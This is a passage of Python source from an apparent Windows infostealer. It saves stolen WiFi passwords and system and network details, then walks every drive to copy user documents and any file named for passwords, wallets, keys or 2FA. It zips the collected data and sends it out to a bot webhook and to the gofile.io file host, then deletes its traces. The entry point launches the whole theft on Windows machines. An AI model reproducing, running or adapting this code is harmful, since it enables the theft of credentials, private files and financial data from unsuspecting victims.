                "wifi_info.txt": [(f"WiFi Profile: {str(p)}\nPassword: {str(pw)}\n\n") for p,pw in Variables.Wifis] if Variables.Wifis else None,
                "system_info.txt": [str(info) for info in Variables.SystemInfo] if Variables.SystemInfo else None,
                "network_info.txt": [(ip + "\n" + country + "\n" + city + "\n" + timezone + "\n" + isp) for ip,country,city,timezone,isp in Variables.Network] if Variables.Network else None
            }

            try:
                for rel_path, data in file_paths.items():
                    if data:
                        full_path = os.path.join(filePath, rel_path)
                        os.makedirs(os.path.dirname(full_path), exist_ok=True)
                        with open(full_path, "a", encoding="utf-8", errors="ignore") as f:
                            if isinstance(data, list):
                                for item in data:
                                    f.write(str(item))
                            else:
                                for item in data:
                                    f.write(str(item))

                # Clean up empty directories
                for dir_name in ["Sessions", "Tokens", "Browsers"]:
                    dir_path = os.path.join(filePath, dir_name)
                    if os.path.exists(dir_path) and len(os.listdir(dir_path)) == 0:
                        try:
                            shutil.rmtree(dir_path)
                        except:
                            pass
            except Exception as e:
                pass

        except Exception as e:
            pass

    async def SendAllData(self) -> None:
        try:
            # Generate a random string for the file name
            uuid = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            filePath: str = os.path.join(self.Temp, uuid)
            shutil.make_archive(filePath, "zip", filePath)

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                async with session.post(webhook_message, json={"chat_id": chat_id}) as response:
                    pass
                if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 49:
                    with open(filePath + ".zip", 'rb') as file:
                        dosya_verisi = file.read()
                    payload = aiohttp.FormData()
                    payload.add_field('chat_id', chat_id)
                    payload.add_field('document', dosya_verisi, filename=os.path.basename(filePath + " " + "bot" + ".zip"))
                    async with session.post(webhook_document, data=payload) as f:
                        pass
                    del payload
                else:
                    succes = await UploadGoFile.upload_file(filePath + ".zip")
                    if succes != None:
                        async with session.post(webhook_message, json={"chat_id": chat_id, "text": succes}) as response:
                            pass
                    else:
                        print("Pinging")
                try:
                    os.remove(filePath + ".zip")
                    shutil.rmtree(filePath)
                except:
                    pass
        except Exception as e:
            pass

class UploadGoFile:
    @staticmethod
    async def upload_file(file_path: str) -> str:
        try:
            upload_url = "https://store1.gofile.io/contents/uploadfile"
            async with aiohttp.ClientSession() as session:
                file_form = aiohttp.FormData()
                file_form.add_field('file', open(file_path, 'rb'), filename=os.path.basename(file_path))

                async with session.post(upload_url, data=file_form) as response:
                    response_body = await response.text()
                    output = json.loads(response_body)

                    download_page = output['data']['downloadPage']
                    return download_page
        except Exception as e:
            print(f"Error uploading file {file_path}: {e}")
            return None

class StealCommonFiles:
    def __init__(self) -> None:
        self.temp = os.getenv("TEMP")
        self.max_depth = 3  # Giới hạn độ sâu quét thư mục cho các ổ không phải C

    async def StealFiles(self) -> None:
        drives = self.get_all_drives()
        username = os.getenv("USERNAME")
        keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup", "acc", "pass", "2fa", "backup"]
        allowed_extensions = [
            ".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp4",
            ".xls", ".xlsx", ".zip", ".7z", ".psd", ".jfif", ".rar", ".bat", ".ps1", ".gif",
            ".html", ".js", ".ts", ".css", ".ppt", ".pptx", ".rtf", ".xml", ".json",
            ".log", ".ini", ".sql", ".db", ".sqlite", ".md", ".yml", ".yaml", ".conf", ".cfg",
            ".avi", ".mkv", ".mov", ".wmv", ".flv", ".m4a", ".wav", ".ogg", ".epub", ".mobi",
            ".azw3", ".lit", ".fb2", ".cbr", ".cbz", ".iso", ".dmg", ".tar", ".gz", ".bz2",
            ".xz", ".svg", ".tiff", ".bmp", ".ico", ".heic", ".heif", ".webp", ".odt", ".ods",
            ".odp", ".odg", ".odf", ".abw", ".docm", ".dot", ".dotx", ".dotm", ".xlsm", ".xlt",
            ".xltx", ".xltm", ".pptm", ".pot", ".potx", ".potm", ".ppam", ".ppsm", ".sldx", ".sldm"
        ]

        tasks = []
        for drive in drives:
            task = asyncio.create_task(self.process_drive(drive, username, keywords, allowed_extensions))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)

    def get_all_drives(self) -> List[str]:
        valid_drives = []
        for drive_letter in range(ord('A'), ord('Z') + 1):
            drive = f"{chr(drive_letter)}:\\"
            try:
                if os.path.exists(drive) and os.access(drive, os.R_OK):
                    valid_drives.append(drive)
                    print(f"Found accessible drive: {drive}")
                else:
                    print(f"Skipping non-existent or inaccessible drive: {drive}")
            except OSError as e:
                print(f"Skipping drive {drive}: {e}")
        return valid_drives

    async def process_drive(self, drive: str, username: str, keywords: List[str], allowed_extensions: List[str]) -> None:
        try:
            # Get country and IP from Maincookie
            country, ip = Maincookie.get_country_and_ip()
            drive_name = drive.replace(':\\', '').replace(':', '_')
            destination_directory = os.path.join(self.temp, f"{country}_{ip}_{drive_name}")

            if not os.path.exists(destination_directory):
                os.makedirs(destination_directory)

            # Define source directories for C: drive
            if drive.upper() == "C:\\":
                user_path = os.path.join(drive, "Users", username)
                source_directories = [
                    (f"{drive}Desktop", os.path.join(user_path, "Desktop")),
                    (f"{drive}Pictures", os.path.join(user_path, "Pictures")),
                    (f"{drive}Documents", os.path.join(user_path, "Documents")),
                    (f"{drive}Music", os.path.join(user_path, "Music")),
                    (f"{drive}Videos", os.path.join(user_path, "Videos")),
                    (f"{drive}Downloads", os.path.join(user_path, "Downloads")),
                    (f"{drive}Favorites", os.path.join(user_path, "Favorites")),
                    (f"{drive}Contacts", os.path.join(user_path, "Contacts")),
                    (f"{drive}Saved Games", os.path.join(user_path, "Saved Games")),
                    (f"{drive}Searches", os.path.join(user_path, "Searches")),
                    (f"{drive}Links", os.path.join(user_path, "Links")),
                    (f"{drive}3D Objects", os.path.join(user_path, "3D Objects")),
                    (f"{drive}OneDrive", os.path.join(user_path, "OneDrive")),
                    (f"{drive}Google Drive", os.path.join(user_path, "Google Drive")),
                    (f"{drive}Dropbox", os.path.join(user_path, "Dropbox")),
                ]
            else:
                # For non-C: drives, scan from root with depth limit
                source_directories = [(f"{drive}Root", drive)]

            # Process each source directory
            for label, source_path in source_directories:
                if os.path.isdir(source_path):
                    print(f"Processing directory: {source_path}")
                    # Use walk_with_depth with no depth limit for C: drive, max_depth for others
                    max_depth = None if drive.upper() == "C:\\" else self.max_depth
                    for folder_path, _, files in self.walk_with_depth(source_path, max_depth=max_depth):
                        for file_name in files:
                            file_path = os.path.join(folder_path, file_name)
                            try:
                                _, file_extension = os.path.splitext(file_name)
                                # Check if file is valid and accessible
                                if not os.path.isfile(file_path) or not os.access(file_path, os.R_OK):
                                    print(f"Skipping inaccessible file: {file_path}")
                                    continue
                                file_size = os.path.getsize(file_path)
                                if (
                                    (file_extension.lower() in allowed_extensions and file_size < 1 * 1024 * 1024)
                                    or any(keyword in file_name.lower() for keyword in keywords)
                                    or label.endswith("Root")
                                ):
                                    # Create destination folder based on source structure
                                    rel_path = os.path.relpath(folder_path, source_path)
                                    destination_folder_path = os.path.join(destination_directory, rel_path)

                                    if not os.path.exists(destination_folder_path):
                                        os.makedirs(destination_folder_path)

                                    destination_path = os.path.join(destination_folder_path, file_name)
                                    try:
                                        shutil.copy2(file_path, destination_path)
                                        print(f"Copied file: {file_path} to {destination_path}")
                                    except (OSError, shutil.Error) as e:
                                        print(f"Failed to copy file {file_path}: {e}")
                                        continue
                            except (OSError, PermissionError) as e:
                                print(f"Error processing file {file_path}: {e}")
                                continue

            # Create ZIP archive after processing drive
            zip_path = os.path.join(self.temp, f"{country}_{ip}_{drive_name}")
            shutil.make_archive(zip_path, 'zip', destination_directory)
            zip_file = f"{zip_path}.zip"
            print(f"Created ZIP archive: {zip_file}")

            # Upload ZIP file
            uploaded_url = await UploadGoFile.upload_file(zip_file)
            if uploaded_url:
                print(f"Uploaded ZIP to: {uploaded_url}")
                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                    async with session.post(webhook_message, json={"chat_id": chat_id, "text": uploaded_url}) as response:
                        print(f"Webhook response status: {response.status}")
            else:
                print(f"Failed to upload ZIP: {zip_file}")

            # Cleanup
            try:
                if os.path.exists(zip_file):
                    os.remove(zip_file)
                if os.path.exists(destination_directory):
                    shutil.rmtree(destination_directory)
                print(f"Cleaned up: {zip_file} and {destination_directory}")
            except OSError as e:
                print(f"Failed to clean up {zip_file}: {e}")

        except Exception as e:
            print(f"Error processing drive {drive}: {e}")
            traceback.print_exc()

    def walk_with_depth(self, path: str, max_depth: int = None):
        """Custom os.walk with depth limit."""
        path = os.path.abspath(path)
        base_depth = path.count(os.sep)
        for root, dirs, files in os.walk(path):
            current_depth = root.count(os.sep) - base_depth
            if max_depth is not None and current_depth > max_depth:
                continue
            yield root, dirs, files

    @staticmethod
    def get_country_and_ip() -> Tuple[str, str]:
        # Sử dụng Maincookie.get_country_and_ip nếu có
        try:
            return Maincookie.get_country_and_ip()
        except AttributeError:
            # Nếu không có Maincookie, sử dụng local implementation
            try:
                response = requests.get("https://ipinfo.io", timeout=5)
                response.raise_for_status()
                data = response.json()
                country = data.get("country", "Unknown")
                ip = data.get("ip", "0.0.0.0")
                return country, ip
            except requests.RequestException as e:
                print(f"Failed to get country and IP: {e}")
                return "Unknown", "0.0.0.0"

if __name__ == '__main__':
    if os.name == "nt":
        #asyncio.run(main())
        Maincookie.execute()
        main_instance = Main()
        asyncio.run(main_instance.FunctionRunner())
        #asyncio.run(StealCommonFiles().StealFiles())